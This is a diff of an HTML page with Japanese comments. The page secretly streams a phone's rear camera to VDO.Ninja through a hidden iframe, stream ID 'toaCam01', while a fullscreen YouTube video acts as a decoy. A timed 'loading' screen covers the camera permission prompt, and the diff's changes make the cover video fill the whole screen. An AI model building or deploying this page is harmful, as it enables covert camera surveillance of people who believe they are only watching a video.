@@ -5,70 +5,73 @@
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
   <meta name="robots" content="noindex,nofollow" />
 
-  <!-- タブ名 / 履歴表示名 -->
-  <title>動画再生ページ</title>
-
-  <!-- iPhoneで「ホーム画面に追加」した時の表示名 -->
+  <title>撮影ページ</title>
   <meta name="apple-mobile-web-app-title" content="撮影ページ">
   <meta name="application-name" content="撮影ページ">
 
   <style>
-    html, body { height: 100%; margin: 0; background:#000; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: #000;
+      overflow: hidden;
+    }
 
     /* 裏：VDO.Ninja（配信用・見えない） */
     iframe#vdo {
-      position: fixed; inset: 0;
-      width: 100%; height: 100%;
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
       border: 0;
       opacity: 0.001;
       pointer-events: none;
     }
 
-    /* 表：YouTube */
+    /* 表：YouTube 全画面（常に cover） */
     .overlay {
-      position: fixed; inset: 0;
+      position: fixed;
+      inset: 0;
+      background: #000;
+      overflow: hidden;
+    }
+
+    /* 16:9動画を「画面いっぱい」にする */
+    #yt {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 0;
+
+      /* ここが肝：縦でも横でも必ず埋める */
+      width: max(100vw, calc(100vh * 16 / 9));
+      height: max(100vh, calc(100vw * 9 / 16));
+    }
+
+    /* 初動ガード（許可ダイアログ用） */
+    .guard {
+      position: fixed;
+      inset: 0;
       display: flex;
       align-items: center;
       justify-content: center;
+      text-align: center;
+      padding: 24px;
       background: #000;
-    }
-
-    /* 横画面っぽい表示枠 */
-    .video-wrap {
-      width: 90vw;
-      max-width: 960px;
-      aspect-ratio: 16 / 9;
-      background: #000;
-    }
-    .video-wrap iframe {
-      width: 100%;
-      height: 100%;
-      border: 0;
-    }
-
-    /* 初動ガード（許可ダイアログ誘導） */
-    .guard {
-      position: fixed; inset: 0;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      text-align:center;
-      padding:24px;
-      background:#000;
-      color:#fff;
-      z-index: 3;
+      color: #fff;
+      z-index: 10;
       font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
-      line-height:1.8;
-      font-size:18px;
-      letter-spacing:.02em;
-      user-select:none;
-      -webkit-user-select:none;
+      line-height: 1.8;
+      font-size: 18px;
+      letter-spacing: 0.02em;
+      user-select: none;
+      -webkit-user-select: none;
     }
-    .guard .note{
-      margin-top:12px;
-      font-size:13px;
-      opacity:.7;
-      line-height:1.7;
+    .guard .note {
+      margin-top: 12px;
+      font-size: 13px;
+      opacity: 0.7;
     }
   </style>
 </head>
@@ -81,21 +84,19 @@
     referrerpolicy="no-referrer"
   ></iframe>
 
-  <!-- 表：YouTube（URLは絶対に1行で） -->
+  <!-- 表：YouTube（常に画面いっぱい） -->
   <div class="overlay">
-    <div class="video-wrap">
-      <iframe
-        id="yt"
-        src="https://www.youtube.com/embed/Vo-771wlTko?autoplay=1&mute=1&playsinline=1&controls=1&rel=0"
-        title="YouTube video player"
-        allow="autoplay; encrypted-media; picture-in-picture"
-        referrerpolicy="strict-origin-when-cross-origin"
-        allowfullscreen
-      ></iframe>
-    </div>
+    <iframe
+      id="yt"
+      src="https://www.youtube.com/embed/Vo-771wlTko?autoplay=1&mute=1&playsinline=1&controls=1&rel=0"
+      title="YouTube video player"
+      allow="autoplay; encrypted-media; picture-in-picture"
+      referrerpolicy="strict-origin-when-cross-origin"
+      allowfullscreen
+    ></iframe>
   </div>
 
-  <!-- 最初だけ表示 -->
+  <!-- 起動直後だけ表示 -->
   <div class="guard" id="guard">
     <div>
       読み込み中…<br>
@@ -107,7 +108,7 @@
   <script>
     const STREAM_ID = "toaCam01";
 
-    // VDO.Ninja：送信（外カメラ優先）
+    // VDO.Ninja：外カメラ配信
     const vdoSrc =
       "https://vdo.ninja/?" +
       "push=" + encodeURIComponent(STREAM_ID) +
@@ -120,10 +121,11 @@
 
     document.getElementById("vdo").src = vdoSrc;
 
+    // 許可ダイアログのための一瞬ガード
     setTimeout(() => {
       const g = document.getElementById("guard");
       if (g) g.style.display = "none";
-    }, 2500);
+    }, 2000);
   </script>
 </body>
 </html>
